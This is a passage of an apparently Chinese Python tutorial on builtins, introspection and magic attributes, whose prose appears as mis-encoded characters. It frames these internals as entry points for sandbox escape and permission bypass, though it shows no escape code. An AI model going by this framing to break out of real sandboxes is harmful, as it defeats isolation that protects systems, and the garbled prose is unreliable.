<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(builtins))  <span class="comment"># åˆ—å‡ºå…¶ä¸­æ‰€æœ‰å†…å®¹</span></span><br></pre></td></tr></table></figure></div>

<h3 id="builtins-æ¨¡å—å†…å®¹"><a href="#builtins-æ¨¡å—å†…å®¹" class="headerlink" title="builtins æ¨¡å—å†…å®¹"></a>builtins æ¨¡å—å†…å®¹</h3><h4 id="å†…ç½®å‡½æ•°ï¼ˆBuilt-in-Functionsï¼‰"><a href="#å†…ç½®å‡½æ•°ï¼ˆBuilt-in-Functionsï¼‰" class="headerlink" title="å†…ç½®å‡½æ•°ï¼ˆBuilt-in Functionsï¼‰"></a>å†…ç½®å‡½æ•°ï¼ˆBuilt-in Functionsï¼‰</h4><p>è¿™æ˜¯æˆ‘ä»¬æœ€ç†Ÿæ‚‰çš„ä¸€ç±»ï¼Œç›´æ¥ä¸Šå¸¸ç”¨å‡½æ•°ä¸¾ä¾‹ï¼š</p>
<table>
<thead>
<tr>
<th>å‡½æ•°</th>
<th>ç”¨é€”è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>print()</code></td>
<td>æ‰“å°è¾“å‡º</td>
</tr>
<tr>
<td><code>len()</code></td>
<td>è·å–é•¿åº¦</td>
</tr>
<tr>
<td><code>type()</code></td>
<td>è·å–ç±»å‹</td>
</tr>
<tr>
<td><code>int()</code></td>
<td>è½¬æ¢æ•´æ•°</td>
</tr>
<tr>
<td><code>str()</code></td>
<td>è½¬æ¢å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td><code>input()</code></td>
<td>è·å–ç”¨æˆ·è¾“å…¥</td>
</tr>
<tr>
<td><code>max()</code>&#x2F;<code>min()</code></td>
<td>è·å–æœ€å¤§&#x2F;æœ€å°</td>
</tr>
<tr>
<td><code>sum()</code></td>
<td>æ±‚å’Œ</td>
</tr>
<tr>
<td><code>sorted()</code></td>
<td>æ’åº</td>
</tr>
<tr>
<td><code>range()</code></td>
<td>ç”ŸæˆèŒƒå›´è¿­ä»£å™¨</td>
</tr>
<tr>
<td><code>abs()</code></td>
<td>ç»å¯¹å€¼</td>
</tr>
<tr>
<td><code>isinstance()</code></td>
<td>åˆ¤æ–­å¯¹è±¡ç±»å‹</td>
</tr>
<tr>
<td><code>enumerate()</code></td>
<td>è·å–ä¸‹æ ‡+å…ƒç´ </td>
</tr>
<tr>
<td><code>zip()</code></td>
<td>æ‰“åŒ…å¤šä¸ªè¿­ä»£å™¨</td>
</tr>
<tr>
<td><code>eval()</code> &#x2F; <code>exec()</code></td>
<td>åŠ¨æ€æ‰§è¡Œå­—ç¬¦ä¸²ä»£ç ï¼ˆå±é™©å‡½æ•°ï¼Œæ…ç”¨ï¼‰</td>
</tr>
</tbody></table>
<blockquote>
<p>ğŸ” è¿™äº›å‡½æ•°æœ¬è´¨ä¸Šç­‰ä»·äº <code>builtins.print()</code>ã€<code>builtins.len()</code> ç­‰ï¼Œä½†æˆ‘ä»¬ç”¨çš„æ—¶å€™å¯ä»¥çœç•¥ <code>builtins.</code>ï¼Œå› ä¸ºå®ƒä»¬è‡ªåŠ¨å¯¼å…¥åˆ°å½“å‰ä½œç”¨åŸŸä¸­ã€‚</p>
</blockquote>
<h4 id="å†…ç½®ç±»å‹ï¼ˆBuilt-in-Typesï¼‰"><a href="#å†…ç½®ç±»å‹ï¼ˆBuilt-in-Typesï¼‰" class="headerlink" title="å†…ç½®ç±»å‹ï¼ˆBuilt-in Typesï¼‰"></a>å†…ç½®ç±»å‹ï¼ˆBuilt-in Typesï¼‰</h4><p>è¿™äº›æ˜¯ Python çš„æ ¸å¿ƒæ•°æ®ç±»å‹ï¼Œéƒ½æ˜¯ç±»ï¼ˆ<code>type</code>ï¼‰ï¼Œå¯å®ä¾‹åŒ–ã€‚</p>
<table>
<thead>
<tr>
<th>ç±»å‹åç§°</th>
<th>ç¤ºä¾‹</th>
<th>ç”¨é€”</th>
</tr>
</thead>
<tbody><tr>
<td><code>int</code></td>
<td><code>int(123)</code></td>
<td>æ•´æ•°ç±»å‹</td>
</tr>
<tr>
<td><code>float</code></td>
<td><code>float(3.14)</code></td>
<td>æµ®ç‚¹æ•°ç±»å‹</td>
</tr>
<tr>
<td><code>str</code></td>
<td><code>&#39;abc&#39;</code></td>
<td>å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td><code>bool</code></td>
<td><code>True</code> &#x2F; <code>False</code></td>
<td>å¸ƒå°”å€¼</td>
</tr>
<tr>
<td><code>list</code></td>
<td><code>[1,2,3]</code></td>
<td>åˆ—è¡¨</td>
</tr>
<tr>
<td><code>tuple</code></td>
<td><code>(1,2,3)</code></td>
<td>å…ƒç»„</td>
</tr>
<tr>
<td><code>dict</code></td>
<td><code>&#123;&#39;a&#39;:1&#125;</code></td>
<td>å­—å…¸</td>
</tr>
<tr>
<td><code>set</code></td>
<td><code>&#123;1,2,3&#125;</code></td>
<td>é›†åˆ</td>
</tr>
<tr>
<td><code>bytes</code></td>
<td><code>b&#39;abc&#39;</code></td>
<td>å­—èŠ‚åºåˆ—</td>
</tr>
<tr>
<td><code>complex</code></td>
<td><code>1+2j</code></td>
<td>å¤æ•°</td>
</tr>
<tr>
<td><code>object</code></td>
<td>æ‰€æœ‰ç±»çš„çˆ¶ç±»</td>
<td></td>
</tr>
<tr>
<td><code>type</code></td>
<td>æ‰€æœ‰ç±»å‹çš„å…ƒç±»</td>
<td></td>
</tr>
</tbody></table>
<p>è¿™äº›ä½ å¯ä»¥å½“ä½œæ„é€ å‡½æ•°ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥åšç±»å‹åˆ¤æ–­ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">isinstance</span>(<span class="number">123</span>, <span class="built_in">int</span>)  <span class="comment"># True</span></span><br></pre></td></tr></table></figure></div>

<h4 id="å†…ç½®å¼‚å¸¸ï¼ˆBuilt-in-Exceptionsï¼‰"><a href="#å†…ç½®å¼‚å¸¸ï¼ˆBuilt-in-Exceptionsï¼‰" class="headerlink" title="å†…ç½®å¼‚å¸¸ï¼ˆBuilt-in Exceptionsï¼‰"></a>å†…ç½®å¼‚å¸¸ï¼ˆBuilt-in Exceptionsï¼‰</h4><p>Python ä¸­æ‰€æœ‰å¼‚å¸¸ç±»å‹ä¹Ÿéƒ½å®šä¹‰åœ¨ <code>builtins</code> ä¸­ï¼Œæ¯”å¦‚ï¼š</p>
<table>
<thead>
<tr>
<th>å¼‚å¸¸åç§°</th>
<th>è§¦å‘åœºæ™¯</th>
</tr>
</thead>
<tbody><tr>
<td><code>Exception</code></td>
<td>æ‰€æœ‰å¼‚å¸¸çš„åŸºç±»</td>
</tr>
<tr>
<td><code>ValueError</code></td>
<td>å€¼ä¸åˆæ³•</td>
</tr>
<tr>
<td><code>TypeError</code></td>
<td>ç±»å‹ä¸åˆæ³•</td>
</tr>
<tr>
<td><code>NameError</code></td>
<td>å˜é‡æœªå®šä¹‰</td>
</tr>
<tr>
<td><code>IndexError</code></td>
<td>ç´¢å¼•è¶Šç•Œ</td>
</tr>
<tr>
<td><code>KeyError</code></td>
<td>å­—å…¸é”®ä¸å­˜åœ¨</td>
</tr>
<tr>
<td><code>AttributeError</code></td>
<td>å±æ€§ä¸å­˜åœ¨</td>
</tr>
<tr>
<td><code>ZeroDivisionError</code></td>
<td>é™¤ä»¥é›¶</td>
</tr>
<tr>
<td><code>ImportError</code> &#x2F; <code>ModuleNotFoundError</code></td>
<td>å¯¼å…¥å¤±è´¥</td>
</tr>
<tr>
<td><code>SyntaxError</code></td>
<td>è¯­æ³•é”™è¯¯ï¼ˆè§£é‡Šå™¨å‘ç°ï¼‰</td>
</tr>
<tr>
<td><code>IndentationError</code></td>
<td>ç¼©è¿›é”™è¯¯</td>
</tr>
</tbody></table>
<p>ä½¿ç”¨ç¤ºä¾‹ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="number">1</span> / <span class="number">0</span></span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;é™¤é›¶é”™è¯¯&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="å†…ç½®å¸¸é‡ï¼ˆBuilt-in-Constantsï¼‰"><a href="#å†…ç½®å¸¸é‡ï¼ˆBuilt-in-Constantsï¼‰" class="headerlink" title="å†…ç½®å¸¸é‡ï¼ˆBuilt-in Constantsï¼‰"></a>å†…ç½®å¸¸é‡ï¼ˆBuilt-in Constantsï¼‰</h4><p>è¿™äº›æ˜¯æ‰€æœ‰ Python ä»£ç ä¸­éƒ½ä¼šé»˜è®¤å¯ç”¨çš„å›ºå®šå€¼ï¼š</p>
<table>
<thead>
<tr>
<th>å¸¸é‡</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td><code>True</code></td>
<td>å¸ƒå°”çœŸ</td>
</tr>
<tr>
<td><code>False</code></td>
<td>å¸ƒå°”å‡</td>
</tr>
<tr>
<td><code>None</code></td>
<td>ç©ºå€¼&#x2F;æ— è¿”å›å€¼</td>
</tr>
<tr>
<td><code>Ellipsis</code></td>
<td><code>...</code>ï¼Œå¯ç”¨ä½œå ä½ç¬¦</td>
</tr>
<tr>
<td><code>NotImplemented</code></td>
<td>æŸäº›æ“ä½œæœªå®ç°æ—¶è¿”å›çš„ç‰¹æ®Šå€¼</td>
</tr>
</tbody></table>
<h3 id="ä½¿ç”¨åœºæ™¯"><a href="#ä½¿ç”¨åœºæ™¯" class="headerlink" title="ä½¿ç”¨åœºæ™¯"></a>ä½¿ç”¨åœºæ™¯</h3><h4 id="åŠ¨æ€ä¿®æ”¹å†…ç½®å‡½æ•°"><a href="#åŠ¨æ€ä¿®æ”¹å†…ç½®å‡½æ•°" class="headerlink" title="åŠ¨æ€ä¿®æ”¹å†…ç½®å‡½æ•°"></a>åŠ¨æ€ä¿®æ”¹å†…ç½®å‡½æ•°</h4><p>å¦‚æœä½ æƒ³é‡å†™ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œä½†ä»ç„¶å¸Œæœ›åœ¨æŸäº›æƒ…å†µä¸‹è°ƒç”¨åŸå§‹çš„å†…ç½®å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡å¯¼å…¥å¹¶ä½¿ç”¨ <code>builtins</code> æ¨¡å—æ¥å®ç°ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹ print çš„è¡Œä¸º</span></span><br><span class="line"><span class="built_in">print</span> = <span class="keyword">lambda</span> *args, **kwargs: builtins.<span class="built_in">print</span>(<span class="string">&quot;ã€DEBUGã€‘&quot;</span>, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello&quot;</span>)  <span class="comment"># è¾“å‡ºï¼š ã€DEBUGã€‘ Hello</span></span><br></pre></td></tr></table></figure></div>

<h4 id="æ§åˆ¶å¯ç”¨çš„å†…ç½®å‡½æ•°"><a href="#æ§åˆ¶å¯ç”¨çš„å†…ç½®å‡½æ•°" class="headerlink" title="æ§åˆ¶å¯ç”¨çš„å†…ç½®å‡½æ•°"></a>æ§åˆ¶å¯ç”¨çš„å†…ç½®å‡½æ•°</h4><p>åœ¨ä½¿ç”¨ <code>eval()</code> æˆ– <code>exec()</code> åŠ¨æ€æ‰§è¡Œä»£ç æ—¶ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®å…¨å±€å­—å…¸ä¸­çš„ <code>__builtins__</code> é¡¹ï¼Œ<strong>æ§åˆ¶å“ªäº›å†…ç½®å‡½æ•°å¯ç”¨æˆ–å®Œå…¨ç¦ç”¨å†…ç½®åŠŸèƒ½</strong>ã€‚</p>
<p>è¿™æ˜¯ä¸€ç§ç”¨äº <strong>æ²™ç®±ï¼ˆsandboxï¼‰å®‰å…¨éš”ç¦»</strong>ã€<strong>é™åˆ¶è¿è¡Œç¯å¢ƒ</strong> çš„æŠ€å·§ï¼Œå¸¸ç”¨äºæ‰§è¡Œç”¨æˆ·æä¾›çš„ä»£ç ä½†é™åˆ¶å…¶æƒé™ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">&quot;print(&#x27;hello&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(code, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)  <span class="comment"># â›” æŠ¥é”™ï¼šname &#x27;print&#x27; is not defined</span></span><br></pre></td></tr></table></figure></div>

<h2 id="å†…çœæœºåˆ¶ï¼ˆIntrospectionï¼‰"><a href="#å†…çœæœºåˆ¶ï¼ˆIntrospectionï¼‰" class="headerlink" title="å†…çœæœºåˆ¶ï¼ˆIntrospectionï¼‰"></a>å†…çœæœºåˆ¶ï¼ˆIntrospectionï¼‰</h2><p>Python çš„ <strong>å†…çœæœºåˆ¶ï¼ˆIntrospectionï¼‰</strong> æ˜¯æŒ‡ç¨‹åºåœ¨ <strong>è¿è¡Œæ—¶</strong> å¯ä»¥æ£€æŸ¥<strong>å¯¹è±¡</strong>çš„<strong>ç±»å‹ã€å±æ€§ã€ç»“æ„ã€æ–¹æ³•</strong>ç­‰ä¿¡æ¯çš„èƒ½åŠ›ã€‚è¿™ä¹Ÿæ˜¯ Python è¢«ç§°ä¸ºâ€œåŠ¨æ€è¯­è¨€â€æˆ–â€œé«˜åº¦è‡ªçœè¯­è¨€â€çš„ä¸€ä¸ªé‡è¦åŸå› ã€‚</p>
<h3 id="å¯¹è±¡çš„ç±»å‹-ç»“æ„"><a href="#å¯¹è±¡çš„ç±»å‹-ç»“æ„" class="headerlink" title="å¯¹è±¡çš„ç±»å‹&#x2F;ç»“æ„"></a>å¯¹è±¡çš„ç±»å‹&#x2F;ç»“æ„</h3><table>
<thead>
<tr>
<th>å·¥å…·&#x2F;å‡½æ•°</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>type(obj)</code></td>
<td>è¿”å›å¯¹è±¡çš„ç±»å‹</td>
</tr>
<tr>
<td><code>id(obj)</code></td>
<td>è¿”å›å¯¹è±¡çš„å†…å­˜åœ°å€ï¼ˆå”¯ä¸€æ ‡è¯†ï¼‰</td>
</tr>
<tr>
<td><code>isinstance(obj, T)</code></td>
<td>åˆ¤æ–­å¯¹è±¡æ˜¯å¦ä¸ºæŸç±»æˆ–å…¶å­ç±»</td>
</tr>
<tr>
<td><code>issubclass(A, B)</code></td>
<td>åˆ¤æ–­ç±» A æ˜¯å¦æ˜¯ç±» B çš„å­ç±»</td>
</tr>
<tr>
<td><code>callable(obj)</code></td>
<td>åˆ¤æ–­å¯¹è±¡æ˜¯å¦å¯è°ƒç”¨ï¼ˆå‡½æ•°&#x2F;ç±»ç­‰ï¼‰</td>
</tr>
</tbody></table>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="string">&quot;hello&quot;</span>))         <span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(<span class="number">123</span>, <span class="built_in">int</span>))  <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">callable</span>(<span class="built_in">len</span>))         <span class="comment"># True</span></span><br></pre></td></tr></table></figure></div>

<h3 id="è·å–å¯¹è±¡æˆå‘˜"><a href="#è·å–å¯¹è±¡æˆå‘˜" class="headerlink" title="è·å–å¯¹è±¡æˆå‘˜"></a>è·å–å¯¹è±¡æˆå‘˜</h3><table>
<thead>
<tr>
<th>å·¥å…·&#x2F;å‡½æ•°</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>dir(obj)</code></td>
<td>åˆ—å‡ºå¯¹è±¡çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•å</td>
</tr>
<tr>
<td><code>hasattr(obj, name)</code></td>
<td>åˆ¤æ–­æ˜¯å¦æœ‰å±æ€§</td>
</tr>
<tr>
<td><code>getattr(obj, name)</code></td>
<td>åŠ¨æ€è·å–å±æ€§</td>
</tr>
<tr>
<td><code>setattr(obj, name, value)</code></td>
<td>è®¾ç½®å±æ€§å€¼</td>
</tr>
<tr>
<td><code>delattr(obj, name)</code></td>
<td>åˆ é™¤å±æ€§</td>
</tr>
</tbody></table>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>): <span class="variable language_">self</span>.name = <span class="string">&quot;Tom&quot;</span></span><br><span class="line"></span><br><span class="line">p = Person()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(p))                 <span class="comment"># æ‰€æœ‰æ–¹æ³•å’Œå±æ€§</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hasattr</span>(p, <span class="string">&#x27;name&#x27;</span>))     <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">getattr</span>(p, <span class="string">&#x27;name&#x27;</span>))     <span class="comment"># &quot;Tom&quot;</span></span><br><span class="line"><span class="built_in">setattr</span>(p, <span class="string">&#x27;age&#x27;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="built_in">print</span>(p.age)                  <span class="comment"># 18</span></span><br></pre></td></tr></table></figure></div>

<h3 id="å‘½åç©ºé—´ä¸ä½œç”¨åŸŸ"><a href="#å‘½åç©ºé—´ä¸ä½œç”¨åŸŸ" class="headerlink" title="å‘½åç©ºé—´ä¸ä½œç”¨åŸŸ"></a>å‘½åç©ºé—´ä¸ä½œç”¨åŸŸ</h3><table>
<thead>
<tr>
<th>å·¥å…·&#x2F;å‡½æ•°</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>globals()</code></td>
<td>è¿”å›å½“å‰æ¨¡å—çš„å…¨å±€å˜é‡å­—å…¸ï¼ˆå¯è¯»å†™ï¼‰</td>
</tr>
<tr>
<td><code>locals()</code></td>
<td>è¿”å›å½“å‰å±€éƒ¨ä½œç”¨åŸŸçš„å˜é‡å­—å…¸ï¼ˆåªè¯»&#x2F;åªå†™ï¼‰</td>
</tr>
<tr>
<td><code>vars([obj])</code></td>
<td>è¿”å›å¯¹è±¡çš„ <code>__dict__</code>ï¼Œæˆ–å½“å‰å±€éƒ¨å˜é‡å­—å…¸</td>
</tr>
</tbody></table>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    y = <span class="number">20</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;globals:&quot;</span>, <span class="built_in">globals</span>().keys())  <span class="comment"># åŒ…æ‹¬ xã€func ç­‰</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;locals:&quot;</span>, <span class="built_in">locals</span>().keys())    <span class="comment"># åªæœ‰ y</span></span><br><span class="line"></span><br><span class="line">func()</span><br></pre></td></tr></table></figure></div>

<h3 id="æ–‡æ¡£ä¸å¸®åŠ©"><a href="#æ–‡æ¡£ä¸å¸®åŠ©" class="headerlink" title="æ–‡æ¡£ä¸å¸®åŠ©"></a>æ–‡æ¡£ä¸å¸®åŠ©</h3><table>
<thead>
<tr>
<th>å·¥å…·&#x2F;å‡½æ•°</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>help(obj)</code></td>
<td>æ˜¾ç¤ºå¸®åŠ©æ–‡æ¡£ï¼ˆäº¤äº’å¼ï¼‰</td>
</tr>
<tr>
<td><code>obj.__doc__</code></td>
<td>è¿”å›å¯¹è±¡çš„ docstring</td>
</tr>
<tr>
<td><code>__annotations__</code></td>
<td>è¿”å›ç±»å‹æ³¨è§£ä¿¡æ¯</td>
</tr>
</tbody></table>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x: <span class="built_in">int</span>, y: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;åŠ æ³•å‡½æ•°&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(add.__doc__)            <span class="comment"># &quot;åŠ æ³•å‡½æ•°&quot;</span></span><br><span class="line"><span class="built_in">print</span>(add.__annotations__)    <span class="comment"># &#123;&#x27;x&#x27;: int, &#x27;y&#x27;: int, &#x27;return&#x27;: int&#125;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="inspect-æ¨¡å—"><a href="#inspect-æ¨¡å—" class="headerlink" title="inspect æ¨¡å—"></a>inspect æ¨¡å—</h3><p><code>inspect</code> æ˜¯ Python æ ‡å‡†åº“ä¸­çš„ introspection å·¥å…·é›†ï¼Œå¯ç”¨äºï¼š</p>
<ul>
<li>å‡½æ•°å‚æ•°ç­¾ååˆ†æ</li>
<li>è·å–æºç ã€å®šä¹‰ä½ç½®ã€æ–‡æ¡£</li>
<li>åˆ¤æ–­å¯¹è±¡ç±»å‹ï¼ˆæ˜¯å¦å‡½æ•°ã€ç±»ã€æ–¹æ³•ã€ç”Ÿæˆå™¨ç­‰ï¼‰</li>
</ul>
<table>
<thead>
<tr>
<th>å¸¸ç”¨å‡½æ•°</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>inspect.getsource(obj)</code></td>
<td>è·å–å¯¹è±¡çš„æºä»£ç </td>
</tr>
<tr>
<td><code>inspect.getdoc(obj)</code></td>
<td>è·å–å¯¹è±¡çš„ docstring</td>
</tr>
<tr>
<td><code>inspect.signature(func)</code></td>
<td>è·å–å‡½æ•°çš„ç­¾åä¿¡æ¯</td>
</tr>
<tr>
<td><code>inspect.isfunction(obj)</code></td>
<td>æ˜¯å¦æ˜¯å‡½æ•°</td>
</tr>
<tr>
<td><code>inspect.getfile(obj)</code></td>
<td>è¿”å›å®šä¹‰å¯¹è±¡çš„æºç æ–‡ä»¶è·¯å¾„</td>
</tr>
<tr>
<td><code>inspect.ismethod(obj)</code></td>
<td>æ˜¯å¦æ˜¯æ–¹æ³•ï¼ˆç±»ä¸­å®šä¹‰ï¼‰</td>
</tr>
<tr>
<td><code>inspect.getmembers(obj)</code></td>
<td>è·å–æˆå‘˜åå’Œå€¼çš„å…ƒç»„åˆ—è¡¨</td>
</tr>
</tbody></table>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name: <span class="built_in">str</span> = <span class="string">&quot;Tom&quot;</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ‰“æ‹›å‘¼&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Hello <span class="subst">&#123;name&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(inspect.getsource(greet))         <span class="comment"># æŸ¥çœ‹æºç </span></span><br><span class="line"><span class="built_in">print</span>(inspect.getdoc(greet))            <span class="comment"># æ‰“æ‹›å‘¼</span></span><br><span class="line"><span class="built_in">print</span>(inspect.signature(greet))         <span class="comment"># (name: str = &#x27;Tom&#x27;) -&gt; str</span></span><br><span class="line"><span class="built_in">print</span>(inspect.getmembers(greet))        <span class="comment"># æ‰€æœ‰æˆå‘˜ä¿¡æ¯ï¼ˆåŒ…æ‹¬ __code__ã€__defaults__ ç­‰ï¼‰</span></span><br></pre></td></tr></table></figure></div>

<h2 id="é­”æœ¯æ–¹æ³•-å±æ€§"><a href="#é­”æœ¯æ–¹æ³•-å±æ€§" class="headerlink" title="é­”æœ¯æ–¹æ³• &#x2F; å±æ€§"></a>é­”æœ¯æ–¹æ³• &#x2F; å±æ€§</h2><p>Python ä¸­ä»¥ <code>__xxx__</code> å‘½åçš„å±æ€§&#x2F;æ–¹æ³•è¢«ç§°ä¸ºé­”æœ¯æ–¹æ³•ï¼ˆmagic methodsï¼‰æˆ–é­”æœ¯å±æ€§ã€‚å®ƒä»¬å…è®¸ä½ <strong>è‡ªå®šä¹‰å¯¹è±¡çš„è¡Œä¸ºã€é‡è½½æ“ä½œç¬¦ã€æ§åˆ¶ç”Ÿå‘½å‘¨æœŸå’Œè®¿é—®æœºåˆ¶</strong>ç­‰ã€‚</p>
<p>åœ¨æ²™ç®±é€ƒé€¸ã€æƒé™ç»•è¿‡ã€åŠ¨æ€æ‰§è¡Œä¸­ï¼Œè¿™äº›æ–¹æ³•å’Œå±æ€§ä¹Ÿèƒ½è¢«ç”¨ä½œå…³é”®å…¥å£ã€‚</p>
<h3 id="æ¨¡å—-ä½œç”¨åŸŸç›¸å…³"><a href="#æ¨¡å—-ä½œç”¨åŸŸç›¸å…³" class="headerlink" title="æ¨¡å— &#x2F; ä½œç”¨åŸŸç›¸å…³"></a>æ¨¡å— &#x2F; ä½œç”¨åŸŸç›¸å…³</h3><h4 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a><code>__builtins__</code></h4><p><code>__builtins__</code> æ˜¯ç”± <strong>Python è§£é‡Šå™¨è‡ªåŠ¨æ³¨å…¥</strong>çš„ä¸€ä¸ª<strong>æ¨¡å—å¯¹è±¡</strong>ï¼Œå®ƒåœ¨<strong>æ¯ä¸ªä½œç”¨åŸŸï¼ˆå…¨å±€ï¼‰</strong>ä¸­é»˜è®¤å­˜åœ¨ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>()</span><br><span class="line">[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(__builtins__)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;module&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>æ¨¡å—å¯¹è±¡æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª<strong>å‘½åç©ºé—´å®¹å™¨</strong>ï¼Œå…¶ä¸­åŒ…å«è¯¥æ¨¡å—ä¸­å®šä¹‰çš„æ‰€æœ‰å†…å®¹ï¼Œå¦‚å‡½æ•°ã€å˜é‡ã€ç±»ç­‰ã€‚è¿™é‡Œçš„å‘½åç©ºé—´å®¹å™¨æ˜¯æŒ‡æ¨¡å—å¯¹è±¡ä¸­çš„ <code>__dict__</code> å±æ€§ï¼Œè®°å½•äº†è¯¥æ¨¡å—ä¸­å®šä¹‰çš„æ‰€æœ‰åå­—ä¸å¯¹è±¡çš„æ˜ å°„ã€‚</p>
</blockquote>
